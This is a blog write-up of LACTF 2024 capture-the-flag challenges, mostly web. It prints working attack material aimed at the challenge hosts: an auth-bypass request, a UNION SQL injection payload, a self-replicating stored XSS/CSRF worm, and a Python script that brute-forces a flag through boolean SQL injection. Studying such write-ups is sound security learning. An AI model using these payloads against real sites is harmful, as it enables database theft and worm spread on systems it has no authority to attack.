---
title: LACTF 2024-Writeup
date: 2024-02-18 20:24:33
tags: ctf
---

# Open

Open to any detailed questions, please DM me on Discord or down below.

# web/flaglang

The code strictly limits the acquisition to flag only when the request cookie contains the specific password same as the randomly generated one, which would normally be impossible to guess. Yet we can simply bypass this limitation by removing the cookie.

![image-20240218195228462](https://api.2h0ng.wiki:443/noteimages/2024/02/18/19-52-28-bae5deebe0a57eb73f37aa61869ae36a.png)

```http
GET /view?country=Flagistan HTTP/2
Host: flaglang.chall.lac.tf

```

![image-20240218195346984](https://api.2h0ng.wiki:443/noteimages/2024/02/18/19-53-47-631792f5d60bbc32ff95bb9bd357dacf.png)

# web/la housing portal

All arguments at `/submit` API, except for `name` , are collected and used in constructing a SQL query statement, which is vulnerable to SQL injection, and comment symbols are filtered out.

![image-20240218195648631](https://api.2h0ng.wiki:443/noteimages/2024/02/18/19-56-48-5266bdb115bb9c9881982b0c3227bbec.png)

My strategy is to remove all arguments but `guests` and conduct a union injection to retrieve the flag.

```http
POST /submit HTTP/2
Host: la-housing.chall.lac.tf
Content-Length: 64
Content-Type: application/x-www-form-urlencoded

name=1&guests=1'+union+select+1,(select+Flag+from+flag),3,4,5,'6
```

![image-20240218195821376](https://api.2h0ng.wiki:443/noteimages/2024/02/18/19-58-21-4b7585bea3b94d2d34a031a23c254b52.png)

# web/new-housing-portal

Core Concepts: XSS + CSRF

Technique: Bypassing innerHTML with event handlers + code worm self-replication

The username field is vulnerable to stored XSS attacks. Since the username is fetched via Ajax and then inserted into the page using innerHTML, directly inserting a script tag won't automatically execute (because window.load has already finished executing). However, event handlers can be used.

Therefore, the payload is slightly more complex, utilizing the onerror event to execute the contents of a script tag. Then, the script tag contains a worm-like self-replicating code, necessary because the entire payload needs to be included as the value of a request parameter in the constructed CSRF request.

Final payload:

```javascript
<img src=1 onerror=eval(document.getElementById('worm').innerHTML)><script id=worm>var headerTag="<script id=worm>"; var jsCode = document.getElementById("worm").innerHTML; var tailTag = "</" + "script>"; var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); var xhr = new XMLHttpRequest(); xhr.open("POST", "https://new-housing-portal.chall.lac.tf/finder"); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.send("username="+"<img src=1 onerror=eval(document.getElementById('worm').innerHTML)>"+wormCode); </script>
```

![image-20240218032756773](https://api.2h0ng.wiki:443/noteimages/2024/02/18/03-27-57-b7829c5431161413d9ca67541199bdcd.png)

# web/pogn

Simply create a Websocket connection through Burp Suite, and wait until the ball hits outside of the boundary.

![image-20240218194518551](https://api.2h0ng.wiki:443/noteimages/2024/02/18/19-45-19-118f6512bcabd020515c94174b84985e.png)



# web/penguin-login 

There is a SQL injection vulnerability with a more strict filter which bans all special characters except `{ _ }'`. The filter also bans the `LIKE` expression.

 The SQL injection vulnerability can only be exploited by error-based injection and boolean injection. The former seems impossible to my best knowledge, and we can use the `SIMILAR TO` [expression](https://www.postgresql.org/docs/current/functions-matching.html#FUNCTIONS-SIMILARTO-REGEXP) as an alternative to `LIKE` for conducting boolean injection.

`SIMILAR TO` expression provides the `_` pattern the same as `.` in POSIX regular expressions.

![image-20240218200440971](https://api.2h0ng.wiki:443/noteimages/2024/02/18/20-04-41-19e70f644ce932262975d2aa67362735.png)

We can leverage `_` to guess the real length of the flag, then craft a script to brute force it out.

![image-20240218200716973](https://api.2h0ng.wiki:443/noteimages/2024/02/18/20-07-17-3e685682bb01015bad86ba595d3486c1.png)

The script:

```
import requests


url = 'https://penguin.chall.lac.tf/submit'


initial_payload = "1' or name SIMILAR TO 'lactf{"


char_set = [chr(i) for i in range(97, 123)] + \
           [chr(i) for i in range(65, 91)] + \
           [chr(i) for i in range(48, 58)] + \
           ['_']


flag = ['_'] * 38


for index in range(len(flag)):
    for char in char_set:

        current_try = flag[:]
        current_try[index] = char
        payload = initial_payload + ''.join(current_try) + "}"

        data = {'username': payload}


        response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})


        if "We found a penguin!!!!!" in response.text:
            flag[index] = char  
            print("Progress:", ''.join(flag))
            break  

print("Final flag:lactf{", ''.join(flag) ,"}")
```

![image-20240218201825305](https://api.2h0ng.wiki:443/noteimages/2024/02/18/20-18-25-234bd3f3df2c8cd183ea26c2699ceac4.png)

One thing remaining to consider is that any number followed by `{` in the `SIMILAR TO` expression would trigger an `invalid repetition counts error`, due to `{` having its special meaning as its a regular pattern too, and any number at this position would throw an error.

![image-20240218201034355](https://api.2h0ng.wiki:443/noteimages/2024/02/18/20-10-34-1c27843ced2e5fe2e8fe537e57de8774.png)

So we have to finalize this flag element by a normal query API.

![image-20240218201448440](https://api.2h0ng.wiki:443/noteimages/2024/02/18/20-14-48-6ea705c4eb99dad57a9d2819d8a2150f.png)

The real element is indeed a number 9.

![image-20240218125515643](https://api.2h0ng.wiki:443/noteimages/2024/02/18/12-55-15-27f1cd437d09089823e7f0548f74b57f.png)

# rev/aplet321

Reverse engineer the binary, and craft the script by reversing the logics.

![image-20240218201655489](https://api.2h0ng.wiki:443/noteimages/2024/02/18/20-16-55-21a6f0d772fc2e94b98e93e6826614f8.png)

Script:

```
# Calculate the occurrences of "please" and "pretty"
please_count = 39
pretty_count = 15

# Construct a string containing enough "please" and "pretty"
# and include "flag" to meet the conditions
input_string = "please" * please_count + "pretty" * pretty_count + "flag"

# Print the generated string, which is part of the program input
print(input_string)

# Verify the length and content of the string
print("Length of the input string:", len(input_string))
print("Occurrences of 'please':", input_string.count("please"))
print("Occurrences of 'pretty':", input_string.count("pretty"))

```

![image-20240218201809426](https://api.2h0ng.wiki:443/noteimages/2024/02/18/20-18-09-dee4fa67128f2694dd3a33297dfde480.png)